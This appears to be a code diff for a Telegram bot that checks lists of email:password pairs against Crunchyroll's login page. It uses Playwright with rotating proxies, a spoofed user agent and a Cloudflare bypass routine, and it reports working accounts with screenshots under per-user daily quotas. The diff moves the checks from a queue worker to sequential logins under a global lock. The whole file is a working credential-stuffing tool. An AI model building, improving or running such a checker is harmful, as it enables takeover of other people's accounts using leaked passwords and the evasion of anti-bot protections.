@@ -12,7 +12,7 @@ from motor.motor_asyncio import AsyncIOMotorClient
 
 # ============ CONFIGURATION FROM ENV ============
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHANNELS = os.getenv("CHANNELS", "").split(",")  # e.g., "channel1,channel2"
+CHANNELS = os.getenv("CHANNELS", "").split(",")
 OWNER_ID = int(os.getenv("OWNER_ID", 0))
 SUPPORT_LINK = os.getenv("SUPPORT_LINK", "https://t.me/yorichiiprime")
 DAILY_LIMIT = int(os.getenv("DAILY_LIMIT", 50))
@@ -69,7 +69,7 @@ PROXY_LIST = load_proxies()
 logger.info(f"Loaded {len(PROXY_LIST)} proxies.")
 
 # ============ CLOUDFLARE BYPASS ============
-async def bypass_cloudflare(page, max_wait=120):
+async def bypass_cloudflare(page, max_wait=60):
     start = asyncio.get_event_loop().time()
     while (asyncio.get_event_loop().time() - start) < max_wait:
         try:
@@ -290,6 +290,118 @@ async def main_menu_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer()
         await send_main_menu(update, context, edit=True)
 
+# ============ GLOBAL LOCK FOR SEQUENTIAL LOGIN ============
+_login_lock = asyncio.Lock()
+
+# ============ ULTRA-FAST LOGIN FUNCTION (LOW MEMORY) ============
+async def login_crunchyroll(email: str, password: str) -> dict:
+    result = {"success": False, "screenshot": None, "message": ""}
+    proxy_str = random.choice(PROXY_LIST) if PROXY_LIST else None
+    proxy = {"server": proxy_str} if proxy_str else None
+
+    async with async_playwright() as p:
+        # Launch with low‑memory arguments
+        browser = await p.chromium.launch(
+            headless=HEADLESS,
+            args=[
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage',
+                '--disable-gpu',
+                '--single-process',
+                '--disable-accelerated-2d-canvas',
+                '--disable-accelerated-video-decode',
+            ],
+            proxy=proxy
+        )
+        context = await browser.new_context(
+            viewport={"width": 800, "height": 600},  # smaller viewport
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            storage_state=None
+        )
+        page = await context.new_page()
+
+        try:
+            sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
+            await page.goto(sso_url, timeout=15000)
+            await page.wait_for_selector("input[name='email'], input[type='email']", timeout=5000)
+
+            if not await bypass_cloudflare(page):
+                result["message"] = "⏱️ Cloudflare timed out."
+                result["screenshot"] = await page.screenshot()
+                return result
+
+            for sel in ["#onetrust-accept-btn-handler", "button:has-text('Accept All')"]:
+                try:
+                    btn = await page.wait_for_selector(sel, timeout=2000)
+                    if btn:
+                        await btn.click()
+                        break
+                except:
+                    pass
+
+            email_field = await page.wait_for_selector("input[name='email'], input[type='email']", timeout=4000)
+            await email_field.fill(email)
+            await asyncio.sleep(0.1)
+
+            password_field = await page.wait_for_selector("input[type='password']", timeout=4000)
+            await password_field.fill(password)
+            await asyncio.sleep(0.1)
+
+            submit_btn = await page.wait_for_selector("button[type='submit'], button:has-text('LOGIN')", timeout=4000)
+            await submit_btn.click()
+
+            await asyncio.sleep(0.5)
+
+            start_time = asyncio.get_event_loop().time()
+            timeout_sec = 20
+
+            while (asyncio.get_event_loop().time() - start_time) < timeout_sec:
+                url = page.url
+                content = await page.content()
+
+                if "www.crunchyroll.com/" in url and "login" not in url and "verifying" not in content.lower():
+                    result["success"] = True
+                    result["message"] = "✅ Login Successful!"
+                    break
+
+                if "incorrect" in content.lower() or "wrong" in content.lower():
+                    result["message"] = "❌ Wrong email or password"
+                    break
+
+                if "verifying" in content.lower():
+                    await asyncio.sleep(0.5)
+                    continue
+
+                if "login" in url and "callback" not in url:
+                    result["message"] = "❌ Login failed – still on login page."
+                    break
+
+                await asyncio.sleep(0.5)
+
+            if not result["message"]:
+                content = await page.content()
+                url = page.url
+                if "www.crunchyroll.com/" in url and "login" not in url and "verifying" not in content.lower():
+                    result["success"] = True
+                    result["message"] = "✅ Login Successful!"
+                else:
+                    result["message"] = "❌ Login failed – timeout."
+
+            result["screenshot"] = await page.screenshot()
+
+        except Exception as e:
+            logger.error(f"Login error for {email}: {e}")
+            result["message"] = f"❌ Error: {str(e)[:150]}"
+            try:
+                result["screenshot"] = await page.screenshot()
+            except:
+                pass
+        finally:
+            await context.close()
+            await browser.close()
+    return result
+
 # ============ COMMANDS ============
 async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -323,7 +435,7 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No valid accounts found.")
         return
 
-    # ---- Owner skip limit ----
+    # Check daily limit for non‑owners
     if user_id != OWNER_ID:
         usage = await get_user_usage(user_id)
         remaining = DAILY_LIMIT - usage["count"]
@@ -332,16 +444,55 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         if len(accounts) > remaining:
             accounts = accounts[:remaining]
-    else:
-        remaining = 999999  # unlimited
 
-    msg = await update.message.reply_text(f"🔄 Processing {len(accounts)} account(s)...")
+    # Send a single status message that we'll edit later
+    status_msg = await update.message.reply_text(f"🔄 Checking {len(accounts)} account(s)...")
 
-    for email, password in accounts:
-        await add_to_queue(context.bot, user_id, update.effective_chat.id, email, password, msg.message_id)
-        await asyncio.sleep(0.5)
+    results = []
+    # Process accounts sequentially with global lock to avoid memory spikes
+    for idx, (email, password) in enumerate(accounts, 1):
+        await status_msg.edit_text(f"🔄 Processing {idx}/{len(accounts)}: `{email}` ...")
 
-    await msg.edit_text(f"✅ Queued {len(accounts)} account(s). You'll get results soon.")
+        # Acquire global lock – only one login at a time
+        async with _login_lock:
+            result = await login_crunchyroll(email, password)
+
+        # Count usage only for non‑owners
+        if user_id != OWNER_ID:
+            new_count = await increment_usage(user_id)
+            used_text = f"{new_count}/{DAILY_LIMIT}"
+        else:
+            used_text = "∞ Unlimited"
+
+        # Build ASCII box
+        if result["success"]:
+            box = (
+                "╭──── success ────╮\n"
+                "  user authenticated ✌️\n"
+                "  successfully 🌀\n"
+                "╰─────────────╯"
+            )
+            caption = f"{box}\n\n`{email}` (Used {used_text} today)"
+            await update.message.reply_photo(photo=SUCCESS_IMAGE, caption=caption)
+        else:
+            box = (
+                "╭──────── failed ────────╮\n"
+                "   ✗ authentication failed ⚠️\n"
+                "   access denied 🚫\n"
+                "╰────────────────────╯"
+            )
+            if result["screenshot"]:
+                caption = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
+                await update.message.reply_photo(photo=result["screenshot"], caption=caption)
+            else:
+                text = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
+                await update.message.reply_text(text)
+
+        # Delay between checks to avoid rate limits
+        if idx < len(accounts):
+            await asyncio.sleep(GLOBAL_DELAY)
+
+    await status_msg.edit_text(f"✅ Finished checking {len(accounts)} account(s).")
 
 async def cmd_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -427,7 +578,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No valid `email:password` lines.")
         return
 
-    # ---- Owner skip limit ----
+    # Check daily limit for non‑owners
     if user_id != OWNER_ID:
         usage = await get_user_usage(user_id)
         remaining = DAILY_LIMIT - usage["count"]
@@ -436,232 +587,48 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         if len(accounts) > remaining:
             accounts = accounts[:remaining]
-    # else: no limit for owner
 
-    msg = await update.message.reply_text(f"📄 Queuing {len(accounts)} accounts from file...")
-    for email, password in accounts:
-        await add_to_queue(context.bot, user_id, update.effective_chat.id, email, password, msg.message_id)
-        await asyncio.sleep(0.5)
+    status_msg = await update.message.reply_text(f"📄 Processing {len(accounts)} accounts from file...")
 
-    await msg.edit_text(f"✅ Queued {len(accounts)} accounts. Results incoming.")
+    for idx, (email, password) in enumerate(accounts, 1):
+        await status_msg.edit_text(f"🔄 Processing {idx}/{len(accounts)}: `{email}` ...")
 
-# ============ QUEUE SYSTEM ============
-task_queue = asyncio.Queue()
-worker_running = False
+        async with _login_lock:
+            result = await login_crunchyroll(email, password)
 
-async def add_to_queue(bot, user_id, chat_id, email, password, msg_id=None):
-    await task_queue.put({
-        "bot": bot,
-        "user_id": user_id,
-        "chat_id": chat_id,
-        "email": email,
-        "password": password,
-        "msg_id": msg_id
-    })
-    global worker_running
-    if not worker_running:
-        worker_running = True
-        asyncio.create_task(worker())
+        if user_id != OWNER_ID:
+            new_count = await increment_usage(user_id)
+            used_text = f"{new_count}/{DAILY_LIMIT}"
+        else:
+            used_text = "∞ Unlimited"
 
-# ============ ULTRA-FAST LOGIN FUNCTION ============
-async def login_crunchyroll(email: str, password: str) -> dict:
-    result = {"success": False, "screenshot": None, "message": ""}
-    proxy_str = random.choice(PROXY_LIST) if PROXY_LIST else None
-    proxy = {"server": proxy_str} if proxy_str else None
-
-    async with async_playwright() as p:
-        browser = await p.chromium.launch(
-            headless=HEADLESS,
-            slow_mo=0,
-            args=['--incognito'],
-            proxy=proxy
-        )
-        context = await browser.new_context(
-            viewport={"width": 1280, "height": 800},
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            storage_state=None
-        )
-        page = await context.new_page()
-
-        try:
-            sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
-            await page.goto(sso_url, timeout=20000)
-            await page.wait_for_selector("input[name='email'], input[type='email']", timeout=8000)
-
-            if not await bypass_cloudflare(page):
-                result["message"] = "⏱️ Cloudflare timed out."
-                result["screenshot"] = await page.screenshot()
-                return result
-
-            for sel in ["#onetrust-accept-btn-handler", "button:has-text('Accept All')"]:
-                try:
-                    btn = await page.wait_for_selector(sel, timeout=2000)
-                    if btn:
-                        await btn.click()
-                        break
-                except:
-                    pass
-
-            email_field = await page.wait_for_selector("input[name='email'], input[type='email']", timeout=4000)
-            await email_field.fill(email)
-            await asyncio.sleep(0.1)
-
-            password_field = await page.wait_for_selector("input[type='password']", timeout=4000)
-            await password_field.fill(password)
-            await asyncio.sleep(0.1)
-
-            submit_btn = await page.wait_for_selector("button[type='submit'], button:has-text('LOGIN')", timeout=4000)
-            await submit_btn.click()
-
-            await asyncio.sleep(2)
-            try:
-                await page.wait_for_load_state("networkidle", timeout=10000)
-            except:
-                pass
-
-            content = await page.content()
-            url = page.url
-
-            if "verifying" in content.lower():
-                for _ in range(5):
-                    await asyncio.sleep(2)
-                    content = await page.content()
-                    if "verifying" not in content.lower():
-                        break
-
-            if "incorrect" in content.lower() or "wrong" in content.lower():
-                result["message"] = "❌ Wrong email or password"
-            elif "www.crunchyroll.com/" in url and "login" not in url and "verifying" not in content.lower():
-                result["success"] = True
-                result["message"] = "✅ Login Successful!"
+        if result["success"]:
+            box = (
+                "╭──── success ────╮\n"
+                "  user authenticated ✌️\n"
+                "  successfully 🌀\n"
+                "╰─────────────╯"
+            )
+            caption = f"{box}\n\n`{email}` (Used {used_text} today)"
+            await update.message.reply_photo(photo=SUCCESS_IMAGE, caption=caption)
+        else:
+            box = (
+                "╭──────── failed ────────╮\n"
+                "   ✗ authentication failed ⚠️\n"
+                "   access denied 🚫\n"
+                "╰────────────────────╯"
+            )
+            if result["screenshot"]:
+                caption = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
+                await update.message.reply_photo(photo=result["screenshot"], caption=caption)
             else:
-                result["message"] = "❌ Login failed – still on verification."
+                text = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
+                await update.message.reply_text(text)
 
-            result["screenshot"] = await page.screenshot()
-
-        except Exception as e:
-            logger.error(f"Login error for {email}: {e}")
-            result["message"] = f"❌ Error: {str(e)[:150]}"
-            try:
-                result["screenshot"] = await page.screenshot()
-            except:
-                pass
-        finally:
-            await browser.close()
-    return result
-
-# ============ WORKER WITH SHORT ANIMATION ============
-async def worker():
-    global worker_running
-    while True:
-        task = await task_queue.get()
-        try:
-            bot = task["bot"]
-            user_id = task["user_id"]
-            chat_id = task["chat_id"]
-            email = task["email"]
-            password = task["password"]
-            msg_id = task.get("msg_id")
-
-            login_task = asyncio.create_task(login_crunchyroll(email, password))
-
-            steps = [
-                ("Grab a cup of tea... 0%", 1.5),
-                ("▰▱▱▱▱▱▱▱▱▱ 20%\n(⁠◕‿◕⁠)", 1.2),
-                ("▰▰▰▱▱▱▱▱▱▱ 40%\n>⁠.⁠<", 1.2),
-                ("▰▰▰▰▰▱▱▱▱▱ 60%\n༼⁠ ⁠つ⁠ ⁠◕‿◕⁠ ⁠༽⁠つ", 1.2),
-                ("▰▰▰▰▰▰▰▱▱▱ 80%\n(⁠＾3＾⁠♪", 1.2),
-            ]
-
-            if msg_id:
-                try:
-                    await bot.edit_message_text(
-                        chat_id=chat_id,
-                        message_id=msg_id,
-                        text=steps[0][0]
-                    )
-                except Exception:
-                    msg = await bot.send_message(chat_id=chat_id, text=steps[0][0])
-                    msg_id = msg.message_id
-            else:
-                msg = await bot.send_message(chat_id=chat_id, text=steps[0][0])
-                msg_id = msg.message_id
-
-            for text, delay in steps[1:]:
-                if login_task.done():
-                    break
-                await asyncio.sleep(delay)
-                try:
-                    await bot.edit_message_text(
-                        chat_id=chat_id,
-                        message_id=msg_id,
-                        text=text
-                    )
-                except Exception:
-                    pass
-
-            if not login_task.done():
-                try:
-                    await bot.edit_message_text(
-                        chat_id=chat_id,
-                        message_id=msg_id,
-                        text="▰▰▰▰▰▰▰▰▰▰ 100%\nAlmost done!"
-                    )
-                except Exception:
-                    pass
-                await login_task
-
-            result = login_task.result()
-            # Owner doesn't consume usage
-            if user_id != OWNER_ID:
-                new_count = await increment_usage(user_id)
-                used_text = f"{new_count}/{DAILY_LIMIT}"
-            else:
-                new_count = 0
-                used_text = "∞ Unlimited"
-
-            try:
-                await bot.delete_message(chat_id=chat_id, message_id=msg_id)
-            except Exception:
-                pass
-
-            if result["success"]:
-                box = (
-                    "╭──── success ────╮\n"
-                    "  user authenticated ✌️\n"
-                    "  successfully 🌀\n"
-                    "╰─────────────╯"
-                )
-                caption = f"{box}\n\n`{email}` (Used {used_text} today)"
-                await bot.send_photo(
-                    chat_id=chat_id,
-                    photo=SUCCESS_IMAGE,
-                    caption=caption
-                )
-            else:
-                box = (
-                    "╭──────── failed ────────╮\n"
-                    "   ✗ authentication failed ⚠️\n"
-                    "   access denied 🚫\n"
-                    "╰────────────────────╯"
-                )
-                if result["screenshot"]:
-                    caption = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
-                    await bot.send_photo(
-                        chat_id=chat_id,
-                        photo=result["screenshot"],
-                        caption=caption
-                    )
-                else:
-                    text = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
-                    await bot.send_message(chat_id=chat_id, text=text)
-
+        if idx < len(accounts):
             await asyncio.sleep(GLOBAL_DELAY)
 
-        except Exception as e:
-            logger.error(f"Worker error: {e}")
-        finally:
-            task_queue.task_done()
+    await status_msg.edit_text(f"✅ Finished checking {len(accounts)} accounts from file.")
 
 # ============ MAIN ============
 def main():
